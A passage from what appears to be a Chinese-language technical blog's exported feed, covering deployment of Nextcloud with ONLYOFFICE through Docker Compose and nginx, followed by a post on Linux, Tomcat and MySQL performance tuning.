class="attribute">fastcgi_intercept_errors</span> <span class="literal">on</span>;</span><br><span class="line">            <span class="attribute">fastcgi_request_buffering</span> <span class="literal">off</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ ^/(?:updater|ocs-provider)(?:$|/)</span> &#123;</span><br><span class="line">            <span class="attribute">try_files</span> $uri/ =<span class="number">404</span>;</span><br><span class="line">            <span class="attribute">index</span> index.php;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Adding the cache control header for js and css files</span></span><br><span class="line">        <span class="comment"># Make sure it is BELOW the PHP block</span></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ \.(?:css|js|woff|svg|gif)$</span> &#123;</span><br><span class="line">            <span class="attribute">try_files</span> $uri /index.php$request_uri;</span><br><span class="line">            <span class="attribute">add_header</span> Cache-Control <span class="string">&quot;public, max-age=15778463&quot;</span>;</span><br><span class="line">           </span><br><span class="line">            <span class="attribute">add_header</span> X-Content-Type-Options nosniff;</span><br><span class="line">            <span class="attribute">add_header</span> X-XSS-Protection <span class="string">&quot;1; mode=block&quot;</span>;</span><br><span class="line">            <span class="attribute">add_header</span> X-Robots-Tag <span class="literal">none</span>;</span><br><span class="line">            <span class="attribute">add_header</span> X-Download-Options noopen;</span><br><span class="line">            <span class="attribute">add_header</span> X-Permitted-Cross-Domain-Policies <span class="literal">none</span>;</span><br><span class="line">            <span class="attribute">add_header</span> Referrer-Policy <span class="literal">no</span>-referrer;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Optional: Don&#x27;t log access to assets</span></span><br><span class="line">            <span class="attribute">access_log</span> <span class="literal">off</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ \.(?:png|html|ttf|ico|jpg|jpeg)$</span> &#123;</span><br><span class="line">            <span class="attribute">try_files</span> $uri /index.php$request_uri;</span><br><span class="line">            <span class="comment"># Optional: Don&#x27;t log access to other assets</span></span><br><span class="line">            <span class="attribute">access_log</span> <span class="literal">off</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="四、安装"><a href="#四、安装" class="headerlink" title="四、安装"></a>四、安装</h3><ul><li><p>目录结构</p></li><li><pre><code>[root@iZ8vbh58r0kcasrljfgu3jZ ~]# tree ..└── nextcloud    ├── docker-compose.yml    └── nginx.conf<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- &#96;&#96;&#96;</span><br><span class="line">  运行安装</span><br><span class="line">  docker-compose up -d</span><br><span class="line">  注： 如果安装太慢，可以配置docker 加速器，如果之前已经有下载了一部分，删除 &#x2F;var&#x2F;lib&#x2F;docker&#x2F;* </span><br><span class="line">  </span><br><span class="line">  设置加速器</span><br><span class="line">  sudo mkdir -p &#x2F;etc&#x2F;docker</span><br><span class="line">  sudo tee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-&#39;EOF&#39;</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;pilvpemn.mirror.aliyuncs.com&quot;]</span><br><span class="line">  &#125;</span><br><span class="line">  EOF</span><br><span class="line">  sudo systemctl daemon-reload</span><br><span class="line">  sudo systemctl restart docker</span><br></pre></td></tr></table></figure></code></pre></li></ul><p><img src="https://img-blog.csdnimg.cn/20200509103543441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-DjDMs2p8-1588991717889)(https://i.loli.net/2020/04/17/tUEaG9kArYOcKVT.png)]"></p><ul><li><pre><code>pull镜像完成后docker-compose ps # 查看容器启动状态[root@iZ8vbh58r0kcasrljfgu3jZ nextcloud]# docker ps -aCONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS                           NAMESf0502eda6c65        nginx                         &quot;nginx -g &#39;daemon of…&quot;   8 seconds ago       Up 6 seconds        0.0.0.0:80-&gt;80/tcp              nextcloud_web_1c5b2fd2f3db4        nextcloud:18.0.3-fpm-alpine   &quot;/entrypoint.sh php-…&quot;   10 seconds ago      Up 7 seconds        9000/tcp                        nextcloud_app_163610bf46fc3        mariadb                       &quot;docker-entrypoint.s…&quot;   10 seconds ago      Up 7 seconds        3306/tcp                        nextcloud_db_1be9c5bad6288        onlyoffice/documentserver     &quot;/bin/sh -c /app/ds/…&quot;   10 seconds ago      Up 5 seconds        443/tcp, 0.0.0.0:6060-&gt;80/tcp   nextcloud_onlyoffice_1访问 ip:80<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  ![\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-VfUeJmsw-1588991504686)(https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;17&#x2F;H9yoOz4LZMKB38b.png)\]](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200509103625922.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)</span><br><span class="line"></span><br><span class="line">![\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-cpJccFoC-1588991504687)(&#x2F;image-20200417012517691.png)\]](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200509103640652.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 五、添加ONLYOFFICE</span><br><span class="line"></span><br><span class="line">等待安装完成后，进入到nextcloud</span><br><span class="line"></span><br><span class="line">选择右上角加号--》应用--》Organization --》ONLYOFFICE (如果没有反应，看下面)</span><br><span class="line"></span><br><span class="line">- 服务器中进入最开始创建镜像的目录</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;</span><br><span class="line">  [root@iZ8vbh58r0kcasrljfgu3jZ nextcloud]# ls </span><br><span class="line">  db  docker-compose.yml  nextcloud  nginx.conf</span><br><span class="line">  [root@iZ8vbh58r0kcasrljfgu3jZ nextcloud]# cd nextcloud&#x2F;</span><br><span class="line">  [root@iZ8vbh58r0kcasrljfgu3jZ nextcloud]# cd apps&#x2F;</span><br><span class="line">  [root@iZ8vbh58r0kcasrljfgu3jZ apps]# git clone https:&#x2F;&#x2F;github.com&#x2F;ONLYOFFICE&#x2F;onlyoffice-nextcloud.git onlyoffice</span><br><span class="line">  正克隆到 &#39;onlyoffice&#39;...</span><br><span class="line">  remote: Enumerating objects: 3, done.</span><br><span class="line">  remote: Counting objects: 100% (3&#x2F;3), done.</span><br><span class="line">  remote: Compressing objects: 100% (3&#x2F;3), done.</span><br><span class="line">  remote: Total 3277 (delta 0), reused 0 (delta 0), pack-reused 3274</span><br><span class="line">  接收对象中: 100% (3277&#x2F;3277), 2.11 MiB | 16.00 KiB&#x2F;s, done.</span><br><span class="line">  处理 delta 中: 100% (2155&#x2F;2155), done.</span><br><span class="line">  </span><br><span class="line">  下载完成后，进入已禁用的应用目录，刷新后，就可以看到onlyoffice，然后把它启用</span><br></pre></td></tr></table></figure></code></pre></li></ul><p><img src="https://img-blog.csdnimg.cn/20200509103725701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>在设置页面中，找到onlyoffice 进行如下配置<br><img src="https://img-blog.csdnimg.cn/20200509103705904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-NBMOYY3z-1588991504689)(/image-20200417013231560.png)]"></li></ul><p><img src="https://img-blog.csdnimg.cn/2020050910375833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="- [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-HfFrN5jl-1588991504690)(./image/image-20200417013532854.png)]"></p><p><img src="https://img-blog.csdnimg.cn/20200509103825687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="- [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-JVE2HypZ-1588991504691)(./image/image-20200417013552747.png)]"></p><p><img src="https://img-blog.csdnimg.cn/20200509103840848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="- [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-gxOZ8xgg-1588991504691)(./image/image-20200417013614781.png)]"></p>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 解决方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> netstat </tag>
            
            <tag> onlyoffic </tag>
            
            <tag> 禅道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 系统优化</title>
      <link href="2020/12/04/Linux_%E4%BC%98%E5%8C%96/"/>
      <url>2020/12/04/Linux_%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h3 id="TCP-连接优化"><a href="#TCP-连接优化" class="headerlink" title="TCP 连接优化"></a>TCP 连接优化</h3><blockquote><p>路由转发模式<br>net.ipv4.ip_forward = 1</p></blockquote><blockquote><p>net.ipv4.tcp_fin_timeout = 30<br>如果套接字由本端要求关闭，这个参数决定了它保持在FIN-WAIT-2状态的时间。对端可以出错并永远不关闭连接，甚至意外当机。缺省值是60 秒。</p></blockquote><blockquote><p>net.ipv4.tcp_max_syn_backlog = 10240<br>表示SYN队列的长度，默认为1024，加大队列长度为10240，可以容纳更多等待连接的网络连接数。 </p></blockquote><blockquote><p>net.ipv4.tcp_keepalive_time = 1200<br>表示当keepalive起用的时候，TCP发送keepalive消息的频度。缺省是2小时，改为20分钟。 </p></blockquote><blockquote><p>net.ipv4.ip_local_port_range = 1024 65000<br>表示用于向外连接的端口范围。缺省情况下很小：32768到61000，改为1024到65000。 </p></blockquote><h3 id="UDP-连接优化"><a href="#UDP-连接优化" class="headerlink" title="UDP 连接优化"></a>UDP 连接优化</h3><blockquote><p>net.core.rmem_default = 8388608<br>net.core.rmem_max = 16777216<br>net.core.wmem_max = 16777216<br>修改UDP 缓冲区大小</p></blockquote><h3 id="系统初始化参数优化"><a href="#系统初始化参数优化" class="headerlink" title="系统初始化参数优化"></a>系统初始化参数优化</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1) 关闭防火墙、selinux</span><br><span class="line">2) 配置合理的yum源</span><br><span class="line">3) 关闭不需要的系统服务</span><br><span class="line">4) 内核优化：</span><br><span class="line">echo &quot;ulimit -SHn 102400&quot; &gt;&gt; &#x2F;etc&#x2F;rc.local</span><br><span class="line">cat &gt;&gt; &#x2F;etc&#x2F;security&#x2F;limits.conf &lt;&lt; EOF</span><br><span class="line">    *           soft   nofile       102400</span><br><span class="line">    *           hard   nofile       102400</span><br><span class="line">    *           soft   nproc        102400</span><br><span class="line">    *           hard   nproc        102400</span><br><span class="line">EOF</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">系统磁盘优化</span><br><span class="line">1)  磁盘分区方案</span><br><span class="line">分区类型     分区的实际大小</span><br><span class="line">&#x2F;           1G-2G</span><br><span class="line">&#x2F;boot       32M-100M (启动分区，最多只要100M左右)</span><br><span class="line">&#x2F;opt        100M-1G (附加应用程序)</span><br><span class="line">&#x2F;tmp        40M-1000M</span><br><span class="line">&#x2F;home       2G-10G (如果需要单独分区。)</span><br><span class="line">&#x2F;usr        3G-10G 最少要500M左右，一般宽松的服务器要分到4-6G)</span><br><span class="line">&#x2F;usr&#x2F;local  3G-15G (自已安装程序安装在此)</span><br><span class="line">&#x2F;var        &gt;2G–硬盘余下全部空间 ( 最少300M-500M，一般2-3G，做服务器的话把上面余下的空间都分给它)</span><br><span class="line">swap    物理内存的两倍(参考值)</span><br><span class="line">2) 物理磁盘优化</span><br><span class="line"> - raid 阵列选择</span><br><span class="line"> - lvm逻辑卷选择</span><br><span class="line"> - 磁盘类型选择</span><br><span class="line">   - ext2：linux下标准文件系统，无日志记录（inode）功能</span><br><span class="line">   - ext3：在ext2基础上增加了日志记录功能（inode），仅支持32000个目录</span><br><span class="line">   - ext4: ext3的后续版本，linux2.6.28内核开始支持，无限子目录支持，快速fsck</span><br><span class="line">   - xfs：高性能文件系统，linux3.10内核开始默认支持</span><br><span class="line">读操作频繁：ext4 </span><br><span class="line">写操作频繁：xfs</span><br><span class="line"></span><br><span class="line">3) xfs 优化</span><br><span class="line">格式化时的参数：</span><br><span class="line">mkfs.xfs -d agcount&#x3D;256 -l size&#x3D;128m,lazy-count&#x3D;1,version&#x3D;2 &#x2F;dev&#x2F;diska1</span><br><span class="line">挂载时的参数:</span><br><span class="line">defaults,noatime,nodiratime,nobarrier,discard,allocsize&#x3D;256m,logbufs&#x3D;8,attr2,logbsize&#x3D;256k</span><br><span class="line"></span><br><span class="line">4) swap 分区优化</span><br><span class="line">&#x2F;proc&#x2F;sys&#x2F;vm&#x2F;swappiness</span><br><span class="line">当系统非常需要使用内存时，内核会把匿名内存（Anonymous memory）和System V的共享内存（shared memory）交换到磁盘上去，而真正的文件不需要交换到交换内存上去，而是直接写会到磁盘文件系统上（清掉page cache）。</span><br><span class="line">调低&#x2F;proc&#x2F;sys&#x2F;vm&#x2F;swappiness时，核心倾向于不交换，主要用于更快的响应速度。如：apache、mysql</span><br><span class="line">调高&#x2F;proc&#x2F;sys&#x2F;vm&#x2F;swappiness时，核心倾向于使用交换内存，主要用于繁忙的吞吐量。如：ftp</span><br></pre></td></tr></table></figure><p>iostat：<br><img src="https://img-blog.csdnimg.cn/20201123154952635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参数说明：</span><br><span class="line">rrqm&#x2F;s：每秒合并放入驱动请求队列的读请求数（当系统调用需要读取数据的时候，VFS将请求发到各个FS，如果FS发现不同的读取请求读取的是相同Block的数据，FS会将这个请求合并Merge）。</span><br><span class="line">wrqm&#x2F;s：每秒合并放入驱动请求队列的写请求数。</span><br><span class="line">rsec&#x2F;s：每秒发给磁盘设备的读请求数。</span><br><span class="line">wsec&#x2F;：每秒发给磁盘设备的写请求数。</span><br><span class="line">rKB&#x2F;s：每秒从磁盘设备读取的KB数。</span><br><span class="line">wKB&#x2F;s：每秒向磁盘设备写入的KB数。</span><br><span class="line">avgrq-sz 平均每次请求大小，单位为扇区(512B)。</span><br><span class="line">avgqu-sz 在驱动请求队列和在设备中活跃的平均请求数。</span><br><span class="line">await： 平均I&#x2F;O响应时间，包括在驱动请求队列里等待和设备的I&#x2F;O响应时间(ms)。一般地系统I&#x2F;O响应时间应该低于5ms，如果大于10ms就比较大了。这个时间包括了队列时间和服务时间，也就是说，一般情况下，await大于svctm，它们的差值越小，则说明队列时间越短，反之差值越大，队列时间越长，说明系统出了问题。</span><br><span class="line">svctm：磁盘设备的I&#x2F;O平均响应时间(ms)。如果svctm的值与await很接近，表示几乎没有I&#x2F;O等待，磁盘性能很好，如果await的值远高于svctm的值，则表示I&#x2F;O队列等待太长系统上运行的应用程序将变慢。</span><br><span class="line">%util： 设备忙处理I&#x2F;O请求的百分比(使用率)。在统计时间内所有处理IO时间，除以总共统计时间。例如，如果统计间隔1秒，该设备有0.8秒在处理IO，而0.2秒闲置，那么该设备的%util &#x3D; 0.8&#x2F;1 &#x3D; 80%，所以该参数暗示了设备的繁忙程度。一般地，如果该参数是100%表示设备已经接近满负荷运行了（当然如果是多磁盘，即使%util是100%，因为磁盘的并发能力，所以磁盘使用未必就到了瓶颈）。</span><br><span class="line">      既然avgrq-sz是合并之后的数字，小尺寸（16个扇区或者更小）可以视为无法合并的实际I&#x2F;O负载的迹象。大尺寸有可能是大I&#x2F;O，或者是合并的连续负载。输出性能里最重要的指标是await。如果应用程序和文件系统使用了降低写延时的方法，w_await可能不那么重要，而更应该关注r_await。</span><br><span class="line">      对于资源使用和容量规划，%util仍然很重要，不过记住这只是繁忙度的一个度量（非空闲时间），对于后面有多块磁盘支持的虚拟设备意义不大。可以通过施加负载更好地了解这些设备:IOPS(r&#x2F;s + w&#x2F;s)以及吞吐量（rkB&#x2F;s + wkB&#x2F;s）。</span><br></pre></td></tr></table></figure><p>vmstat:<br><img src="https://img-blog.csdnimg.cn/2020112315370463.png#pic_center" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1) procs:</span><br><span class="line">- r列表示运行和等待cpu时间片的进程数，这个如果长期大于系统cpu个数，说明cpu不足，需要增加cpu</span><br><span class="line">- b列表示在等待资源的进程数，比如等待I&#x2F;O,或者内存交换等</span><br><span class="line"></span><br><span class="line">2) procs标准：    r 不超过cpu进程数</span><br><span class="line">3) swap标准：    si,so长期不为0,说明内存不足，需要加内存</span><br><span class="line">4) io标准：    bi+bo超过1000，而且wa值较高，说明磁盘IO有问题，应提高磁盘读写性能</span><br><span class="line">5) system标准：    </span><br><span class="line">- us长期超过50%，用户进程消耗cpu,需要考虑优化程序或算法</span><br><span class="line">- sy长期超过50%，内核消耗的cpu资源很多</span><br><span class="line">- us+sy长期超过80%，说明可能cpu资源部足</span><br><span class="line">- id cpu空闲的百分比</span><br><span class="line">- wa 参考值20%，如果超过20%,说明io等待严重</span><br><span class="line">cpu重点：r    cs  us  sy id  wa值的大小</span><br></pre></td></tr></table></figure><h1 id="tomcat-优化"><a href="#tomcat-优化" class="headerlink" title="tomcat 优化"></a>tomcat 优化</h1><p>优化内存，主要是在bin/catalina.bat/sh 配置文件中进行。linux上，在catalina.sh中添加：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JAVA_OPTS&#x3D;&quot;-server -Xms1G -Xmx2G -Xss256K -Djava.awt.headless&#x3D;true -Dfile.encoding&#x3D;utf-8 -XX:MaxPermSize&#x3D;256m -XX:PermSize&#x3D;128M -XX:MaxPermSize&#x3D;256M&quot;</span><br></pre></td></tr></table></figure><p>其中：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">• -server：启用jdk的server版本。</span><br><span class="line">• -Xms：虚拟机初始化时的最小堆内存。</span><br><span class="line">• -Xmx：虚拟机可使用的最大堆内存。 #-Xms与-Xmx设成一样的值，避免JVM因为频繁的GC导致性能大起大落</span><br><span class="line">• -XX:PermSize：设置非堆内存初始值,默认是物理内存的1&#x2F;64。</span><br><span class="line">• -XX:MaxNewSize：新生代占整个堆内存的最大值。</span><br><span class="line">• -XX:MaxPermSize：Perm（俗称方法区）占整个堆内存的最大值，也称内存最大永久保留区域。</span><br></pre></td></tr></table></figure><p>这些以后再看，先看优化的！</p><blockquote><p>1）错误提示：java.lang.OutOfMemoryError:Java heap space<br>Tomcat默认可以使用的内存为128MB，在较大型的应用项目中，这点内存是不够的，有可能导致系统无法运行。常见的问题是报Tomcat内存溢出错误，Outof Memory(系统内存不足)的异常，从而导致客户端显示500错误，一般调整Tomcat的-Xms和-Xmx即可解决问题，通常将-Xms和-Xmx设置成一样，堆的最大值设置为物理可用内存的最大值的80%。</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set JAVA_OPTS&#x3D;-Xms512m-Xmx512m</span><br></pre></td></tr></table></figure><blockquote><p>2）错误提示：java.lang.OutOfMemoryError: PermGenspace<br>PermGenspace的全称是Permanent Generationspace,是指内存的永久保存区域，这块内存主要是被JVM存放Class和Meta信息的,Class在被Loader时就会被放到PermGenspace中，它和存放类实例(Instance)的Heap区域不同,GC(Garbage Collection)不会在主程序运行期对PermGenspace进行清理，所以如果你的应用中有很CLASS的话,就很可能出现PermGen space错误，这种错误常见在web服务器对JSP进行precompile的时候。如果你的WEB APP下都用了大量的第三方jar, 其大小超过了jvm默认的大小(4M)那么就会产生此错误信息了。解决方法：</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setJAVA_OPTS&#x3D;-XX:PermSize&#x3D;128M</span><br></pre></td></tr></table></figure><blockquote><p>3）在使用-Xms和-Xmx调整tomcat的堆大小时，还需要考虑垃圾回收机制。如果系统花费很多的时间收集垃圾，请减小堆大小。一次完全的垃圾收集应该不超过3-5 秒。如果垃圾收集成为瓶颈，那么需要指定代的大小，检查垃圾收集的详细输出，研究垃圾收集参数对性能的影响。一般说来，你应该使用物理内存的 80% 作为堆大小。当增加处理器时，记得增加内存，因为分配可以并行进行，而垃圾收集不是并行的。</p></blockquote><blockquote><ol><li>JVM参数调优：-Xms表示JVM初始化堆的大小，-Xmx表示JVM堆的最大值。这两个值的大小一般根据需要进行设置。当应用程序需要的内存超出堆的最大值时虚拟机就会提示内存溢出，并且导致应用服务崩溃。因此一般建议堆的最大值设置为可用内存的最大值的80%。在catalina.bat中，设置JAVA_OPTS=’-Xms256m -Xmx512m’，表示初始化内存为256MB，可以使用的最大内存为512MB。 </li></ol></blockquote><blockquote><ol start="3"><li>调整线程数<br>通过应用程序的连接器（Connector）进行性能控制的的参数是创建的处理请求的线程数。Tomcat使用线程池加速响应速度来处理请求。在Java中线程是程序运行时的路径，是在一个程序中与其它控制线程无关的、能够独立运行的代码段。它们共享相同的地址空间。多线程帮助程序员写出CPU最大利用率的高效程序，使空闲时间保持最低，从而接受更多的请求。<br>Tomcat4中可以通过修改minProcessors和maxProcessors的值来控制线程数。这些值在安装后就已经设定为默认值并且是足够使用的，但是随着站点的扩容而改大这些值。minProcessors服务器启动时创建的处理请求的线程数应该足够处理一个小量的负载。也就是说，如果一天内每秒仅发生5次单击事件，并且每个请求任务处理需要1秒钟，那么预先设置线程数为5就足够了。但在你的站点访问量较大时就需要设置更大的线程数，指定为参数maxProcessors的值。maxProcessors的值也是有上限的，应防止流量不可控制（或者恶意的服务攻击），从而导致超出了虚拟机使用内存的大小。如果要加大并发连接数，应同时加大这两个参数。web server允许的最大连接数还受制于操作系统的内核参数设置，通常Windows是2000个左右，Linux是1000个左右。<br>在Tomcat5对这些参数进行了调整，请看下面属性：<br>maxThreads    Tomcat使用线程来处理接收的每个请求。这个值表示Tomcat可创建的最大的线程数。<br>acceptCount    指定当所有可以使用的处理请求的线程数都被使用时，可以放到处理队列中的请求数，超过这个数的请求将不予处理。<br>connnectionTimeout    网络连接超时，单位：毫秒。设置为0表示永不超时，这样设置有隐患的。通常可设置为30000毫秒。<br>minSpareThreads    Tomcat初始化时创建的线程数。<br>maxSpareThreads     一旦创建的线程超过这个值，Tomcat就会关闭不再需要的socket线程。<br>最好的方式是多设置几次并且进行测试，观察响应时间和内存使用情况。在不同的机器、操作系统或虚拟机组合的情况下可能会不同，而且并不是所有人的web站点的流量都是一样的，因此没有一刀切的方案来确定线程数的值。 </li></ol></blockquote><p>Tomcat作为Web服务器，它的处理性能直接关系到用户体验，下面是几种常见的优化措施：</p><blockquote><p> 一、掉对web.xml的监视，把jsp提前编辑成Servlet。有富余物理内存的情况，加大tomcat使用的jvm的内存</p></blockquote><blockquote><p>二、服务器资源<br>服务器所能提供CPU、内存、硬盘的性能对处理能力有决定性影响。<br>　　(1) 对于高并发情况下会有大量的运算，那么CPU的速度会直接影响到处理速度。<br>　　(2) 内存在大量数据处理的情况下，将会有较大的内存容量需求，可以用-Xmx -Xms -XX:MaxPermSize等参数对内存不同功能块进行划分。我们之前就遇到过内存分配不足，导致虚拟机一直处于full GC，从而导致处理能力严重下降。<br>　　(3) 硬盘主要问题就是读写性能，当大量文件进行读写时，磁盘极容易成为性能瓶颈。最好的办法还是利用下面提到的缓存。</p></blockquote><blockquote><p>三、利用缓存和压缩<br>     对于静态页面最好是能够缓存起来，这样就不必每次从磁盘上读。这里我们采用了Nginx作为缓存服务器，将图片、css、js文件都进行了缓存，有效的减少了后端tomcat的访问。<br>　　另外，为了能加快网络传输速度，开启gzip压缩也是必不可少的。但考虑到tomcat已经需要处理很多东西了，所以把这个压缩的工作就交给前端的Nginx来完成。<br>　　除了文本可以用gzip压缩，其实很多图片也可以用图像处理工具预先进行压缩，找到一个平衡点可以让画质损失很小而文件可以减小很多。曾经我就见过一个图片从300多kb压缩到几十kb，自己几乎看不出来区别。</p></blockquote><blockquote><p>四、采用集群<br> 单个服务器性能总是有限的，最好的办法自然是实现横向扩展，那么组建tomcat集群是有效提升性能的手段。我们还是采用了Nginx来作为请求分流的服务器，后端多个tomcat共享session来协同工作。</p></blockquote><blockquote><p>五、 优化tomcat参数<br>这里以tomcat7的参数配置为例，需要修改conf/server.xml文件，主要是优化连接配置，关闭客户端dns查询。</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Connector port&#x3D;&quot;8080&quot;   </span><br><span class="line">           protocol&#x3D;&quot;org.apache.coyote.http11.Http11NioProtocol&quot;  </span><br><span class="line">           connectionTimeout&#x3D;&quot;20000&quot;  </span><br><span class="line">           redirectPort&#x3D;&quot;8443&quot;   </span><br><span class="line">           maxThreads&#x3D;&quot;500&quot;   </span><br><span class="line">           minSpareThreads&#x3D;&quot;20&quot;  </span><br><span class="line">           acceptCount&#x3D;&quot;100&quot; </span><br><span class="line">           disableUploadTimeout&#x3D;&quot;true&quot; </span><br><span class="line">           enableLookups&#x3D;&quot;false&quot;   </span><br><span class="line">           URIEncoding&#x3D;&quot;UTF-8&quot; &#x2F;&gt; </span><br></pre></td></tr></table></figure><h1 id="mysql-优化"><a href="#mysql-优化" class="headerlink" title="mysql 优化"></a>mysql 优化</h1><h2 id="sql方面"><a href="#sql方面" class="headerlink" title="sql方面"></a>sql方面</h2><ul><li><p>合理利用索引，并清除无效索引</p></li><li><p>SQL语句中的IN包含的值不要过多</p></li><li><p>SELECT 的时候必须制定字段名称，防止查询数据时过度消耗系统性能</p></li><li><p>当只需要一条数据的时候，使用limit1，这是为了使EXPLAIN中type列达到const类型</p></li><li><p>如果限制条件中其他字段没有索引，尽量少用or </p><!--or两边的字段中，如果有一个不是索引字段，而其他条件也不是索引字段，会造成该查询不走索引的情况。很多时候使用 union all 或者是union(必要的时候)的方式来代替“or”会得到更好的效果--> </li><li><p>尽量用union all代替union </p></li><li><p>使用合理的分页方式以提高分页的效率  例如select id,name from product limit 866613, 20 有时数据量过大的表，分页查询不合理，反而会导致查询变慢。</p><!--优化的方法如下：可以取前一页的最大行数的id，然后根据这个最大的id来限制下一页的起点。比如此列中，上一页最大的id是866612。sql可以采用如下的写法：--> </li><li><p>避免默认填充null  并避免在 where 子句中对字段进行 null 值判断 ，因为null的判断会导致引擎放弃使用索引而去进行全局扫描。 可以使用explain 查看索引使用情况。</p></li><li><p>不建议使用%前缀模糊查询 例如LIKE “%name”或者LIKE “%name%”，这种查询会导致索引失效而进行全表扫描。但是可以使用LIKE “name%”。 </p><p>这种情况可以使用全局索引   语法</p><p><code>ALTER TABLE dynamic_201606 ADD FULLTEXT INDEX   idx_user_name  (user_name);</code></p></li></ul><p>  关于JOIN优化</p><p>  LEFT JOIN A表为驱动表INNER JOIN MySQL会自动找出那个数据少的表作用驱动表RIGHT JOIN B表为驱动表</p><p>  注意：MySQL中没有full join，可以用以下方式来解决</p><p>  <code>select * from A left join B on B.name = A.namewhere B.name is nullunion allselect * from B;</code></p><p>  尽量使用inner join，避免left join</p><h2 id="配置方面"><a href="#配置方面" class="headerlink" title="配置方面"></a>配置方面</h2><ul><li><p><strong>修改innodb_buffer_pool_cache 设置mysql使用内存大小</strong>，防止内存溢出。</p></li><li><p><strong>修改wait_timeout参数值，默认为8小时。</strong>  MySQL客户端的数据库连接闲置最大时间值。 </p></li><li><p><strong>修改max_connections参数值，默认为151</strong>，可以改为3000多。 MySql的最大连接数 </p></li><li><p><strong>修改max_user_connections值，由默认的0</strong>，修改为800   指每个数据库用户的最大连接 </p></li><li><p><strong>修改back_log参数值:由默认的50修改为500</strong> 。指出在MySQL暂时停止回答新请求之前的短时间内多少个请求可以被存在堆栈中。 </p></li></ul><p>back_log值指出在MySQL暂时停止回答新请求之前的短时间内多少个请求可以被存在堆栈中。也就是说，如果MySql的连接数据达到max_connections时，新来的请求将会被存在堆栈中，以等待某一连接释放资源，该堆栈的数量即back_log，如果等待连接的数量超过back_log，将不被授予连接资源。将会报：unauthenticated user | 